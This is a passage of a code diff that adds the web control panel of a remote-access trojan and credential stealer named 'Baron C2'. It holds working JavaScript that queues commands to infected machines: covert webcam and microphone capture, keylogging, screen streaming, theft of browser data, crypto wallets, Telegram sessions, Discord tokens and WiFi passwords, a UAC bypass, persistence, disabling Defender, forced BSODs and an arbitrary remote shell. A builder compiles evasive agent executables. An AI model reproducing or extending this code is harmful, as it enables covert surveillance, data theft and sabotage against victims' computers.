+                        <i class="fa-solid fa-radiation"></i>
+                        <h4>Global Panic</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Terminate all connections</p>
+                    </div>
+                    <div class="admin-card danger" onclick="adminAction('nuke_db')">
+                        <i class="fa-solid fa-bomb"></i>
+                        <h4>Nuke Database</h4>
+                        <p style="font-size: 0.8rem; color: var(--text-muted); margin-top: 5px;">Factory Reset C2</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+            <!-- Card: Changelog -->
+            <div class="os-window" id="win-changelog">
+                <div class="win-header">
+                    <div class="win-title"><i class="fa-solid fa-receipt"></i> System Changelog</div>
+                </div>
+            <div class="win-body">
+                <div class="cl-item">
+                    <div class="cl-version">v3.5 Deep Fix (Liquid Glass)</div>
+                    <div class="cl-date">29 March 2026</div>
+                    <ul class="cl-list">
+                        <li><b>CRITICAL FIX:</b> Agent JSON parser — commands were silently dropped due to whitespace mismatch.</li>
+                        <li><b>Dynamic Island:</b> Liquid Glass effect with reactive states (alert/danger/success).</li>
+                        <li><b>Result Viewer:</b> Full-screen modal auto-opens when command results arrive.</li>
+                        <li><b>Screen Viewer:</b> Live stream overlay with FPS counter and controls.</li>
+                        <li><b>WebSocket Auth:</b> Fixed panel room join — real-time updates now work.</li>
+                        <li><b>Auto-refresh:</b> Client list updates every 10s + WebSocket push.</li>
+                        <li><b>Offline Detection:</b> Agents marked DEAD after 30s (was 5 minutes).</li>
+                        <li><b>Context Menu:</b> Added 6 new actions — Discord, WiFi, Grabber, Shell, SysInfo, Processes.</li>
+                        <li><b>Island Badge:</b> Shows live connected agent count.</li>
+                        <li><b>Log Rendering:</b> Server logs now appear in terminal panel.</li>
+                    </ul>
+                </div>
+                <div class="cl-item">
+                    <div class="cl-version">v3.0 Sovereign (God Mode)</div>
+                    <div class="cl-date">21 March 2026</div>
+                    <ul class="cl-list">
+                        <li><b>UI Transformation:</b> Full rewrite into a Spatial WebGL OS.</li>
+                        <li><b>Three.js Background:</b> High-tech interactive wireframe globe.</li>
+                        <li><b>Dynamic Island:</b> Top notification bubble for instant alerts.</li>
+                        <li><b>Window Manager v2:</b> Fully draggable, z-index managed windows.</li>
+                        <li><b>Security Phase 1:</b> Tarpitting, IP-Whitelisting, Honeypots embedded.</li>
+                        <li><b>File Integrity:</b> FIM thread active on server.py.</li>
+                        <li><b>New Context Menu:</b> 12+ modules mapped in right-click logic.</li>
+                    </ul>
+                </div>
+                <div class="cl-item">
+                    <div class="cl-version">v2.1 Tactical Update</div>
+                    <div class="cl-date">10 March 2026</div>
+                    <ul class="cl-list">
+                        <li>Fixed Roslyn compiler paths (`csc.exe`).</li>
+                        <li>Added Extractors: Telegram, Cold Crypto Wallets.</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        </div> <!-- End Dashboard Grid -->
+
+        <!-- Custom Context Menu for Clients -->
+        <div id="context-menu">
+            <div class="cm-group">
+                <div class="cm-title">Surveillance</div>
+                <div class="cm-item" onclick="cmd('screen_start')"><i class="fa-solid fa-desktop"></i> Watch Screen</div>
+                <div class="cm-item" onclick="cmd('webcam_start')"><i class="fa-solid fa-video"></i> Stealth Webcam</div>
+                <div class="cm-item" onclick="cmd('audio_start')"><i class="fa-solid fa-microphone"></i> Bug Microphone</div>
+                <div class="cm-item" onclick="cmd('keylog_start')"><i class="fa-solid fa-keyboard"></i> Get Keystrokes</div>
+            </div>
+            <div class="cm-group">
+                <div class="cm-title">Data Extraction</div>
+                <div class="cm-item" onclick="cmd('browsers')"><i class="fa-brands fa-chrome"></i> Dump Browsers</div>
+                <div class="cm-item" onclick="cmd('crypto_wallets')"><i class="fa-brands fa-bitcoin"></i> Find Wallets</div>
+                <div class="cm-item" onclick="cmd('telegram')"><i class="fa-brands fa-telegram"></i> Clone Telegram</div>
+                <div class="cm-item" onclick="cmd('discord')"><i class="fa-brands fa-discord"></i> Discord Tokens</div>
+                <div class="cm-item" onclick="cmd('grabber')"><i class="fa-solid fa-magnet"></i> Ultimate Grabber</div>
+                <div class="cm-item" onclick="cmd('wifi')"><i class="fa-solid fa-wifi"></i> WiFi Passwords</div>
+            </div>
+            <div class="cm-group">
+                <div class="cm-title">System & Execution</div>
+                <div class="cm-item" onclick="cmd('info')"><i class="fa-solid fa-circle-info"></i> System Info</div>
+                <div class="cm-item" onclick="cmd('processes')"><i class="fa-solid fa-list"></i> Process List</div>
+                <div class="cm-item" onclick="cmdShell()"><i class="fa-solid fa-terminal"></i> Run Command</div>
+                <div class="cm-item" onclick="cmd('uac_bypass')"><i class="fa-solid fa-shield-halved"></i> UAC Fodhelper</div>
+                <div class="cm-item" onclick="cmd('reverse_proxy')"><i class="fa-solid fa-server"></i> Reverse Proxy</div>
+                <div class="cm-item" onclick="cmd('persist_install')"><i class="fa-solid fa-anchor"></i> Install Persistence</div>
+            </div>
+            <div class="cm-group">
+                <div class="cm-title" style="color:var(--danger)">Destructive</div>
+                <div class="cm-item danger" onclick="cmd('bsod')"><i class="fa-solid fa-skull"></i> Trigger BSOD</div>
+                <div class="cm-item danger" onclick="cmd('defender')"><i class="fa-solid fa-radiation"></i> Nuke Defender</div>
+                <div class="cm-item danger" onclick="cmd('uninstall')"><i class="fa-solid fa-trash"></i> Melt & Uninstall</div>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Result Modal -->
+    <div class="result-overlay" id="result-overlay" onclick="if(event.target===this)closeResult()">
+        <div class="result-modal">
+            <div class="result-header">
+                <h3 id="result-title"><i class="fa-solid fa-terminal"></i> COMMAND OUTPUT</h3>
+                <div style="display:flex;gap:8px;align-items:center">
+                    <button class="result-close" onclick="downloadResult()" title="Save as TXT" style="background:var(--accent);color:#000"><i class="fa-solid fa-download"></i></button>
+                    <button class="result-close" onclick="copyResult()" title="Copy to clipboard" style="background:rgba(255,255,255,0.1)"><i class="fa-solid fa-copy"></i></button>
+                    <button class="result-close" onclick="closeResult()"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+            </div>
+            <div class="result-body" id="result-body">Waiting for data...</div>
+        </div>
+    </div>
+
+    <!-- Screen Viewer -->
+    <div class="screen-overlay" id="screen-overlay">
+        <img id="screen-img" src="" alt="Live Screen" />
+        <div class="screen-bar">
+            <span id="screen-fps">0 FPS</span>
+            <span id="screen-res">--</span>
+            <button onclick="stopStream()"><i class="fa-solid fa-stop"></i> Stop Stream</button>
+            <button onclick="closeScreenViewer()" style="background:rgba(255,255,255,0.1)"><i class="fa-solid fa-xmark"></i> Close</button>
+        </div>
+    </div>
+
+    <!-- ---------------------------------------------------
+         JAVASCRIPT ENGINE
+    --------------------------------------------------- -->
+    <script>
+        let token = localStorage.getItem('baron_token') || null;
+        let socket = null;
+        let selectedClient = null;
+
+        // Context menu handling
+        const ctxMenu = document.getElementById('context-menu');
+        document.addEventListener('click', e => {
+            if(!ctxMenu.contains(e.target)) ctxMenu.classList.remove('active');
+        });
+        
+        function attachContextMenu() {
+            const rows = document.querySelectorAll('#clients-body tr');
+            rows.forEach(row => {
+                row.addEventListener('contextmenu', e => {
+                    e.preventDefault();
+                    if(row.children[0].textContent === 'No connected agents') return;
+                    
+                    selectedClient = row.dataset.id;
+                    
+                    // Position menu
+                    ctxMenu.style.left = `${e.clientX}px`;
+                    ctxMenu.style.top = `${e.clientY}px`;
+                    
+                    // Prevent overflow
+                    const rect = ctxMenu.getBoundingClientRect();
+                    if(e.clientX + rect.width > window.innerWidth) ctxMenu.style.left = `${window.innerWidth - rect.width - 10}px`;
+                    if(e.clientY + rect.height > window.innerHeight) ctxMenu.style.top = `${window.innerHeight - rect.height - 10}px`;
+                    
+                    ctxMenu.classList.add('active');
+                });
+            });
+        }
+
+        function cmd(action) {
+            if(!selectedClient) return;
+            logTerminal(`Executing <${action}> on ${selectedClient.substring(0,8)}...`, 'sys');
+            ctxMenu.classList.remove('active');
+            
+            // Auto-subscribe to stream when starting screen/webcam
+            if(action === 'screen_start' || action === 'webcam_start') {
+                socket.emit('subscribe_stream', { cid: selectedClient, type: action.replace('_start','') });
+                islandNotify('tv', 'STARTING STREAM...', 'alert', 3000);
+            }
+            
+            fetch('/api/panel/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify({ cid: selectedClient, cmd: { action: action } })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) {
+                    logTerminal(`Task queued: ${action} (id: ${data.task_id})`, 'succ');
+                    islandNotify('bolt', `SENT: ${action.toUpperCase()}`, 'success', 2000);
+                }
+                else logTerminal(`Failed: ${data.error}`, 'err');
+            })
+            .catch(e => logTerminal(`Network error: ${e}`, 'err'));
+        }
+
+        function cmdShell() {
+            if(!selectedClient) return;
+            const command = prompt('Enter command to execute on target:');
+            if(!command) return;
+            ctxMenu.classList.remove('active');
+            logTerminal(`Shell> ${command} on ${selectedClient.substring(0,8)}...`, 'sys');
+            fetch('/api/panel/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify({ cid: selectedClient, cmd: { action: 'shell', command: command } })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) logTerminal(`Shell task queued (id: ${data.task_id})`, 'succ');
+                else logTerminal(`Failed: ${data.error}`, 'err');
+            })
+            .catch(e => logTerminal(`Network error: ${e}`, 'err'));
+        }
+
+        function adminAction(action) {
+            if(!confirm(`Are you sure you want to execute [${action}]? This action might be destructive.`)) return;
+            logTerminal(`Executing Admin Action: ${action}`, 'warn');
+            fetch('/api/panel/admin_action', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify({ action: action })
+            })
+            .then(r => r.json())
+            .then(d => {
+                if(d.ok) logTerminal(`[${action}] Executed successfully`, 'succ');
+                else logTerminal(`[${action}] Failed: ${d.error}`, 'err');
+            });
+        }
+
+        // --- 4. Theming ---
+        function setTheme(thm) {
+            document.documentElement.setAttribute('data-theme', thm);
+            localStorage.setItem('baron_theme', thm);
+            // Re-init 3D line colors based on theme accent
+            let c = '#D4AF37';
+            if(thm==='sapphire') c='#2f80ed';
+            if(thm==='ruby') c='#ff4757';
+            if(thm==='emerald') c='#2ed573';
+            if(thm==='amethyst') c='#9b59b6';
+            if(window.globeMaterial) window.globeMaterial.color.set(c);
+        }
+        const savedTheme = localStorage.getItem('baron_theme') || 'gold';
+        setTheme(savedTheme);
+
+
+        // --- 5. Three.js Background Engine (Cyber Globe) ---
+        function init3D() {
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            document.getElementById('canvas-container').appendChild(renderer.domElement);
+
+            // Create Wireframe Globe
+            const geometry = new THREE.IcosahedronGeometry(10, 2);
+            // Get color from CSS variable
+            const style = getComputedStyle(document.body);
+            const accent = style.getPropertyValue('--accent').trim() || '#D4AF37';
+            
+            const material = new THREE.MeshBasicMaterial({ 
+                color: accent, 
+                wireframe: true,
+                transparent: true,
+                opacity: 0.15
+            });
+            window.globeMaterial = material; // expose for theme changes
+            
+            const globe = new THREE.Mesh(geometry, material);
+            scene.add(globe);
+
+            // Add particles
+            const pGeo = new THREE.BufferGeometry();
+            const pCount = 500;
+            const pArray = new Float32Array(pCount * 3);
+            for(let i=0; i<pCount*3; i++) {
+                pArray[i] = (Math.random() - 0.5) * 50;
+            }
+            pGeo.setAttribute('position', new THREE.BufferAttribute(pArray, 3));
+            const pMat = new THREE.PointsMaterial({ size: 0.05, color: '#ffffff', transparent: true, opacity: 0.3 });
+            const particles = new THREE.Points(pGeo, pMat);
+            scene.add(particles);
+
+            camera.position.z = 20;
+
+            function animate() {
+                requestAnimationFrame(animate);
+                globe.rotation.y += 0.001;
+                globe.rotation.x += 0.0005;
+                particles.rotation.y -= 0.0005;
+                
+                // Slow breathing effect on mouse move (Parallax)
+                camera.position.x += (mouseX * 0.5 - camera.position.x) * 0.05;
+                camera.position.y += (-mouseY * 0.5 - camera.position.y) * 0.05;
+                camera.lookAt(scene.position);
+                
+                renderer.render(scene, camera);
+            }
+            
+            let mouseX = 0, mouseY = 0;
+            document.addEventListener('mousemove', e => {
+                mouseX = (e.clientX / window.innerWidth) * 2 - 1;
+                mouseY = (e.clientY / window.innerHeight) * 2 - 1;
+            });
+            
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+            
+            animate();
+        }
+        init3D();
+
+        // --- 6. Core Logic (Auth & Socket) ---
+        const authScreen = document.getElementById('auth-screen');
+        const workspace = document.getElementById('workspace');
+
+        function logTerminal(msg, type='info') {
+            const term = document.getElementById('terminal');
+            const d = new Date();
+            const time = `${d.getHours().toString().padStart(2,'0')}:${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}`;
+            term.innerHTML += `<div class="log-line"><span class="log-time">[${time}]</span> <span class="log-${type}">${msg}</span></div>`;
+            term.scrollTop = term.scrollHeight;
+        }
+
+        // Setup Login event
+        document.getElementById('btn-login').addEventListener('click', () => {
+            const l = document.getElementById('login-user').value;
+            const p = document.getElementById('login-pass').value;
+            
+            if(!l || !p) return;
+            
+            fetch('/api/panel/login', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ login: l, password: p })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if(data.ok) {
+                    token = data.token;
+                    localStorage.setItem('baron_token', token);
+                    enterWorkspace();
+                } else {
+                    document.getElementById('auth-error').innerText = data.error;
+                    const card = document.querySelector('.auth-card');
+                    card.style.transform = "translateX(5px)"; setTimeout(()=>card.style.transform="translateX(-5px)",50); setTimeout(()=>card.style.transform="translateX(0)",100);
+                }
+            }).catch(e => {
+                document.getElementById('auth-error').innerText = "Network Error";
+            });
+        });
+
+        document.getElementById('login-pass').addEventListener('keypress', e => { if(e.key==='Enter') document.getElementById('btn-login').click(); });
+
+        function enterWorkspace() {
+            authScreen.classList.add('hidden');
+            workspace.style.display = 'block';
+            
+            // Auto-fill Server URL
+            document.getElementById('b-url').value = window.location.origin;
+
+            setTimeout(() => {
+                workspace.style.opacity = '1';
+                initSocket();
+                fetchClients();
+                if(_refreshInterval) clearInterval(_refreshInterval);
+                _refreshInterval = setInterval(fetchClients, 15000);
+            }, 500);
+        }
+
+        function logout() {
+            localStorage.removeItem('baron_token');
+            socket.disconnect();
+            location.reload();
+        }
+
+        // Auto-login check
+        if(token) {
+            fetch('/api/panel/check', { headers: { 'X-Token': token }})
+            .then(r => r.json())
+            .then(d => { if(d.ok) enterWorkspace(); else localStorage.removeItem('baron_token'); });
+        }
+
+        // --- 7. Networking & Socket ---
+        let _clientCount = 0;
+        let _streamFrameCount = 0;
+        let _streamFpsTimer = null;
+
+        function initSocket() {
+            if(window._ws_reconnecting) return;
+            const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const ws = new WebSocket(proto + '//' + location.host + '/ws');
+            
+            socket = {
+                handlers: {},
+                on: function(event, callback) { this.handlers[event] = callback; },
+                emit: function(event, data) {
+                    if(ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ event: event, data: data }));
+                },
+                disconnect: function() { ws.close(); }
+            };
+
+            ws.onopen = () => {
+                window._ws_reconnecting = false;
+                socket.emit('auth', { token: token });
+                islandNotify('shield', 'SECURE UPLINK', 'success');
+                logTerminal("Socket connected to Mainframe.", "succ");
+            };
+
+            ws.onclose = () => {
+                islandNotify('plug-circle-xmark', 'UPLINK LOST', 'danger');
+                logTerminal("Socket disconnected. Reconnecting in 5s...", "err");
+                window._ws_reconnecting = true;
+                setTimeout(initSocket, 5000);
+            };
+
+            ws.onmessage = (e) => {
+                try {
+                    const msg = JSON.parse(e.data);
+                    if (msg.event && socket.handlers[msg.event]) socket.handlers[msg.event](msg.data);
+                } catch (err) {}
+            };
+
+            socket.on('auth_ok', data => {
+                logTerminal(`Authenticated as ${data.user}. Real-time updates active.`, "succ");
+                islandNotify('crown', `${data.user.toUpperCase()} — GOD MODE`, 'success');
+            });
+
+            socket.on('clients_update', data => {
+                const clients = Array.isArray(data) ? data : Object.values(data);
+                const online = clients.filter(c => {
+                    const last = new Date(c.last_seen).getTime();
+                    return (Date.now() - last) < 60000;
+                }).length;
+                
+                if(online !== _clientCount) {
+                    _clientCount = online;
+                    updateBadge(online);
+                }
+                renderClients(data);
+            });
+
+            socket.on('client_new', data => {
+                logTerminal(`New agent connected: ${data.hostname} from ${data.ip}`, 'warn');
+                islandNotify('user-plus', `NEW: ${data.hostname}`, 'alert', 5000);
+                fetchClients();
+            });
+
+            socket.on('log_sys', data => {
+                logTerminal(data.msg, 'sys');
+            });
+
+            socket.on('task_queued', data => {
+                const action = data.task?.action || '?';
+                logTerminal(`Task dispatched to ${data.cid?.substring(0,8)}: ${action}`, 'info');
+                islandNotify('bolt', `TASK: ${action.toUpperCase()}`, 'alert', 2000);
+            });
+
+            socket.on('result', data => {
+                const tag = data.type || 'result';
+                const fullData = data.data || '';
+                const snippet = fullData.substring(0, 300);
+                const cid = data.cid?.substring(0,8) || '?';
+                
+                logTerminal(`[${cid}] ${tag}: ${snippet}${fullData.length > 300 ? '...' : ''}`, 'succ');
+                islandNotify('check-circle', `RESULT: ${tag.toUpperCase()}`, 'success', 3000);
+
+                if(fullData.length > 20 && !['screen','webcam','audio','clickscreen'].includes(tag)) {
+                    showResult(tag.toUpperCase() + ' — Agent ' + cid, fullData);
+                }
+            });
+
+            socket.on('stream_frame', data => {
+                const img = document.getElementById('screen-img');
+                const overlay = document.getElementById('screen-overlay');
+                
+                if(data.data) {
+                    img.src = 'data:image/jpeg;base64,' + data.data;
+                    _streamFrameCount++;
+                    
+                    if(!overlay.classList.contains('active')) {
+                        overlay.classList.add('active');
+                        islandNotify('tv', 'LIVE STREAM', 'alert');
+                        
+                        if(_streamFpsTimer) clearInterval(_streamFpsTimer);
+                        _streamFpsTimer = setInterval(() => {
+                            document.getElementById('screen-fps').textContent = _streamFrameCount + ' FPS';
+                            _streamFrameCount = 0;
+                        }, 1000);
+                    }
+                }
+            });
+
+            socket.on('upload_new', data => {
+                logTerminal(`File uploaded from agent: ${data.filename} (${data.size} bytes)`, 'warn');
+                islandNotify('cloud-arrow-up', `FILE: ${data.filename}`, 'alert', 4000);
+            });
+        }
+
+        // --- 8. Result Modal ---
+        let _resultTitle = '';
+        function showResult(title, content) {
+            _resultTitle = title;
+            document.getElementById('result-title').innerHTML = `<i class="fa-solid fa-terminal"></i> ${title}`;
+            document.getElementById('result-body').textContent = content;
+            document.getElementById('result-overlay').classList.add('active');
+        }
+        function closeResult() {
+            document.getElementById('result-overlay').classList.remove('active');
+        }
+        function downloadResult() {
+            const content = document.getElementById('result-body').textContent;
+            const filename = (_resultTitle || 'result').replace(/[^a-zA-Z0-9]/g, '_') + '.txt';
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = filename;
+            document.body.appendChild(a); a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            islandNotify('download', `SAVED: ${filename}`, 'success', 2000);
+        }
+        function copyResult() {
+            const content = document.getElementById('result-body').textContent;
+            navigator.clipboard.writeText(content).then(() => {
+                islandNotify('clipboard', 'COPIED!', 'success', 1500);
+            }).catch(() => {
+                // Fallback
+                const ta = document.createElement('textarea');
+                ta.value = content; document.body.appendChild(ta);
+                ta.select(); document.execCommand('copy');
+                document.body.removeChild(ta);
+                islandNotify('clipboard', 'COPIED!', 'success', 1500);
+            });
+        }
+
+        // --- 9. Screen Viewer ---
+        function stopStream() {
+            if(selectedClient) {
+                cmd('screen_stop');
+                islandNotify('stop', 'STREAM STOPPED', 'danger', 2000);
+            }
+        }
+        function closeScreenViewer() {
+            document.getElementById('screen-overlay').classList.remove('active');
+            if(_streamFpsTimer) { clearInterval(_streamFpsTimer); _streamFpsTimer = null; }
+        }
+
+        // --- 10. Dynamic Island Reactive System ---
+        let _islandTimer = null;
+        const _islandDefault = { icon: 'shield-halved', text: 'BARON C2 ACTIVE' };
+
+        function islandNotify(icon, text, state='alert', duration=3000, action=null) {
+            const isl = document.getElementById('dynamic-island');
+            const txt = document.getElementById('island-text');
+            const ico = document.querySelector('.island-icon');
+            const dot = document.querySelector('.island-dot');
+            const act = document.getElementById('island-action-container');
+
+            if(_islandTimer) clearTimeout(_islandTimer);
+            act.innerHTML = '';
+
+            isl.classList.remove('island-alert', 'island-danger', 'island-success', 'expanded');
+            isl.classList.add('island-' + state);
+
+            ico.className = 'island-icon fa-solid fa-' + icon;
+            txt.textContent = text;
+
+            if(action) {
+                isl.classList.add('expanded');
+                const btn = document.createElement('button');
+                btn.className = 'island-btn';
+                btn.innerText = action.text;
+                btn.onclick = (e) => { e.stopPropagation(); action.callback(); };
+                act.appendChild(btn);
+            }
+
+            if(state === 'success') { dot.style.background = 'var(--success)'; dot.style.boxShadow = '0 0 10px var(--success)'; }
+            else if(state === 'danger') { dot.style.background = 'var(--danger)'; dot.style.boxShadow = '0 0 10px var(--danger)'; }
+            else { dot.style.background = 'var(--accent)'; dot.style.boxShadow = '0 0 10px var(--accent-glow)'; }
+
+            _islandTimer = setTimeout(() => {
+                isl.classList.remove('island-alert', 'island-danger', 'island-success', 'expanded');
+                ico.className = 'island-icon fa-solid fa-' + _islandDefault.icon;
+                txt.textContent = _islandDefault.text;
+                dot.style.background = 'var(--success)';
+                act.innerHTML = '';
+            }, duration);
+        }
+
+        function updateBadge(count) {
+            const badge = document.getElementById('island-badge');
+            badge.textContent = count;
+            badge.style.display = count > 0 ? 'inline' : 'none';
+        }
+
+        function flashIsland(msg) {
+            islandNotify('bell', msg, 'alert', 4000);
+        }
+
+        function toggleIsland() {
+            const isl = document.getElementById('dynamic-island');
+            isl.classList.toggle('expanded');
+        }
+
+        // Auto-refresh every 10 seconds
+        let _refreshInterval = null;
+
+        function fetchClients() {
+            fetch('/api/panel/clients', { headers: { 'X-Token': token }})
+            .then(r => r.json())
+            .then(d => {
+                if(d.ok && d.clients) {
+                    renderClients(d.clients);
+                }
+            })
+            .catch(() => {});
+        }
+
+
+        let _clientMap = new Map();
+        function refreshClientsList() {
+            const btn = document.getElementById('btn-refresh-clients');
+            btn.classList.add('status-new');
+            fetchClients();
+            setTimeout(() => btn.classList.remove('status-new'), 1000);
+        }
+
+        function renderClients(data) {
+            const tbody = document.getElementById('clients-body');
+            const clients = Array.isArray(data) ? data : Object.values(data);
+            
+            // Update internal map to handle uniqueness
+            clients.forEach(c => _clientMap.set(c.id, c));
+            
+            // Clean up dead ones (not seen for > 1 hour)
+            const hourAgo = Date.now() - (60 * 60 * 1000);
+            for (let [id, c] of _clientMap) {
+                if (new Date(c.last_seen).getTime() < hourAgo) _clientMap.delete(id);
+            }
+
+            tbody.innerHTML = '';
+            if(_clientMap.size === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:var(--text-muted)">No connected agents (Ghost Town)</td></tr>`;
+                return;
+            }
+            
+            const sortedClients = Array.from(_clientMap.values()).sort((a,b) => new Date(b.last_seen) - new Date(a.last_seen));
+            
+            sortedClients.forEach(c => {
+                const diff = (Date.now() - new Date(c.last_seen).getTime()) / 1000;
+                const isOnline = diff < 40; 
+                const statusClass = isOnline ? 'status-online' : 'status-offline';
+                const statusTxt = isOnline ? 'ONLINE' : 'DEAD';
+                
+                let icon = 'fa-windows';
+                const osStr = (c.os || '').toLowerCase();
+                if(osStr.includes('linux')) icon = 'fa-linux';
+                if(osStr.includes('mac') || osStr.includes('darwin')) icon = 'fa-apple';
+                
+                let integrity = c.is_admin ? "<span style='color:var(--danger)'>SYSTEM/ADMIN</span>" : "User";
+
+                const tr = document.createElement('tr');
+                tr.dataset.id = c.id;
+                tr.innerHTML = `
+                    <td style="font-family:var(--font-mono); font-size: 0.8rem; color:var(--text-muted)">${c.id.substring(0,8)}</td>
+                    <td><b>${c.username || '?'}</b> @ ${c.hostname || '?'}</td>
+                    <td style="font-family:var(--font-mono)">${c.ip || '?'}</td>
+                    <td><i class="fa-brands ${icon} os-icon"></i> ${c.os || '?'}</td>
+                    <td>${integrity}</td>
+                    <td><div class="status-badge ${statusClass}"><div style="width:6px;height:6px;border-radius:50%;background:currentColor"></div>${statusTxt}</div></td>
+                `;
+                tbody.appendChild(tr);
+            });
+            attachContextMenu();
+        }
+
+        // --- 8. Builder Logic ---
+        function compilePayload() {
+            const btn = document.getElementById('btn-build');
+            btn.innerText = "COMPILING (010110)...";
+            btn.disabled = true;
+            
+            const payload = {
+                server: document.getElementById('b-url').value,
+                name: document.getElementById('b-name').value,
+                beacon: 5000,
+                hidden: document.getElementById('b-hide').checked,
+                persist: document.getElementById('b-persist').checked,
+                defender: document.getElementById('b-defend').checked,
+                bsod: document.getElementById('b-bsod').checked,
+                anti: document.getElementById('b-anti').checked
+            };
+
+            fetch('/api/panel/build', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-Token': token },
+                body: JSON.stringify(payload)
+            }).then(r => r.json()).then(d => {
+                if(d.ok) {
+                    btn.innerText = "COMPILE BINARY";
+                    btn.disabled = false;
+                    if(d.download_url) {
+                        logTerminal(`Payload compiled successfully: ${d.name}.exe`, 'succ');
+                        islandNotify('download', 'PAYLOAD READY', 'success', 10000, {
+                            text: 'DOWNLOAD EXE',
+                            callback: () => { window.location = d.download_url; }
+                        });
+                    } else {
+                        if (d.compile_err) {
+                            logTerminal(`Compilation FAILED: ${d.compile_err}`, 'err');
+                            islandNotify('exclamation-triangle', 'COMPILE ERROR', 'danger', 5000);
+                        }
+                        if(d.source) {
+                            logTerminal(`Providing source code for manual compilation...`, 'info');
+                            showResult("AGENT SOURCE CODE (C#)", d.source);
+                        }
+                    }
+                } else {
+                    btn.innerText = "ERROR - CHECK LOGS";
+                    btn.disabled = false;
+                    logTerminal(`Build Failed: ${d.error}`, 'err');
+                }
+            }).catch(e => {
+                btn.innerText = "NETWORK ERROR"; btn.disabled = false;
+            });
+        }
+
+
+
+    
+
+function execute(cid, action, params = {}) {
+    if(!cid) return;
+    const cmdData = Object.assign({ cid: cid, action: action }, params);
+    socket.emit('command', cmdData);
+    logTerminal(`Sent <${action}> to ${cid.substring(0,8)}`, 'sys');
+}
+
+// Override or update cmd
+if (typeof original_cmd === 'undefined') {
+    var original_cmd = window.cmd;
+    window.cmd = function(action) {
+        if(!selectedClient) return;
+        if(action === 'audio_start') { 
+            if(typeof startAudioStream === 'function') startAudioStream(); 
+        }
+        if(action === 'keylogger') {
+            if(typeof startKeylogger === 'function') startKeylogger();
+        }
+        execute(selectedClient, action);
+    };
+}
+
+// Keep-Alive: Ping server every 5 minutes while dashboard is open
+setInterval(() => {
+    fetch('/api/ping').then(r => r.json()).then(d => console.log("Keep-alive:", d.status));
+}, 5 * 60 * 1000);
+
+// PCM Player logic
+let nextAudioTime = 0;
+function playPCM(base64Data) {
+    if(!audioCtx) return;
+    const binary = atob(base64Data);
+    const len = binary.length;
+    const buffer = new Int16Array(len / 2);
+    for (let i = 0; i < len; i += 2) {
+        buffer[i / 2] = (binary.charCodeAt(i + 1) << 8) | binary.charCodeAt(i);
+    }
+    
+    const float32 = new Float32Array(buffer.length);
+    for (let i = 0; i < buffer.length; i++) {
+        float32[i] = buffer[i] / 32768; 
+    }
+    
+    const audioBuffer = audioCtx.createBuffer(1, float32.length, 16000); 
+    audioBuffer.getChannelData(0).set(float32);
+    
+    const source = audioCtx.createBufferSource();
+    source.buffer = audioBuffer;
+    source.connect(audioCtx.destination);
+    
+    let startTime = Math.max(audioCtx.currentTime, nextAudioTime);
+    source.start(startTime);
+    nextAudioTime = startTime + audioBuffer.duration;
+}
+
+// --- DRAGGABLE WINDOWS ENGINE ---
+let zIndexCounter = 10500;
+function createDragWindow(id, title, icon, extraHtml = '') {
+    if(document.getElementById(id)) return document.getElementById(id);
+    const win = document.createElement('div');
+    win.className = 'drag-window';
+    win.id = id;
+    win.style.left = Math.random() * 100 + 100 + 'px';
+    win.style.top = Math.random() * 100 + 100 + 'px';
+    win.style.width = '600px';
+    win.style.height = '400px';
+    win.style.zIndex = ++zIndexCounter;
+    
+    win.onmousedown = () => { win.style.zIndex = ++zIndexCounter; };
+    
+    win.innerHTML = `
+        <div class="drag-header" id="${id}-header">
+            <div class="drag-title"><i class="${icon}"></i> ${title}</div>
+            <div class="drag-close" onclick="document.getElementById('${id}').remove();"><i class="fa-solid fa-xmark"></i></div>
+        </div>
+        <div class="drag-content" id="${id}-content">
+            ${extraHtml}
+        </div>
+    `;
+    document.body.appendChild(win);
+    
+    // Drag Logic
+    const header = document.getElementById(`${id}-header`);
+    let pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
+    header.onmousedown = dragMouseDown;
+    
+    function dragMouseDown(e) {
+        e.preventDefault();
+        pos3 = e.clientX; pos4 = e.clientY;
+        document.onmouseup = closeDragElement;
+        document.onmousemove = elementDrag;
+    }
+    
+    function elementDrag(e) {
+        e.preventDefault();
+        pos1 = pos3 - e.clientX; pos2 = pos4 - e.clientY;
+        pos3 = e.clientX; pos4 = e.clientY;
+        win.style.top = (win.offsetTop - pos2) + "px";
+        win.style.left = (win.offsetLeft - pos1) + "px";
+    }
+    
+    function closeDragElement() {
+        document.onmouseup = null;
+        document.onmousemove = null;
+    }
+    return win;
+}
+
+// --- WEB AUDIO CONTEXT API (PCM VISUALIZER) ---
+let audioCtx = null;
+let audioDrawVisual = null;
+function startAudioStream() {
+    cmd('audio_start');
